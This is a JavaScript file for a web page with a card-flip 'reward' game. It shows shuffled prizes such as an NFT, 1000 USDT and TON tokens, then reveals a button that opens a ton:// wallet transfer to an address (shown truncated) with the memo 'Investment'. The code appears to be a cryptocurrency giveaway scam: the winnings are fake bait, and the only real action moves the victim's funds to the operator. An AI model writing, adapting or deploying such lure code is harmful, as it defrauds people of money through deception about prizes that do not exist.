
const rewards = [
  { type:"NFT", label:"Valuable NFT", img:"images/nft.png" },
  { type:"USDT", label:"1000 USDT", img:"images/usdt.png" },
  { type:"DOGS", label:"500 DOGS", img:"images/dogs.png" },
  { type:"TON", label:"5.7 TON", img:"images/ton.png" },
  { type:"DEDUST", label:"300 DeDust", img:"images/dedust.png" },
  { type:"ECORE", label:"500 Ecorepay", img:"images/ecorepay.png" }
];

rewards.sort(()=>Math.random()-0.5);

const cardsEl = document.getElementById("cards");
let flipped=false;

rewards.forEach((reward)=>{
  const card=document.createElement("div");
  card.className="card";
  card.innerHTML=`
    <div class="card-inner">
      <div class="card-face card-back">🂠</div>
      <div class="card-face card-front">
        <img src="${reward.img}" />
        <div class="reward-title">${reward.type}</div>
        <div class="reward-value">${reward.label}</div>
      </div>
    </div>
  `;
  card.onclick=()=>{
    if(flipped) return;
    flipped=true;
    card.classList.add("flipped");
    document.querySelectorAll(".card").forEach(c=>{ if(c!==card) c.style.opacity=0.4; });
    const cta=document.getElementById("cta");
    setTimeout(()=>{ cta.style.display="block"; },1000);
  };
  cardsEl.appendChild(card);
});

document.getElementById("investBtn").onclick=()=>{
  window.location.href="ton://transfer/EQC9...xA7P?text=Investment";
};
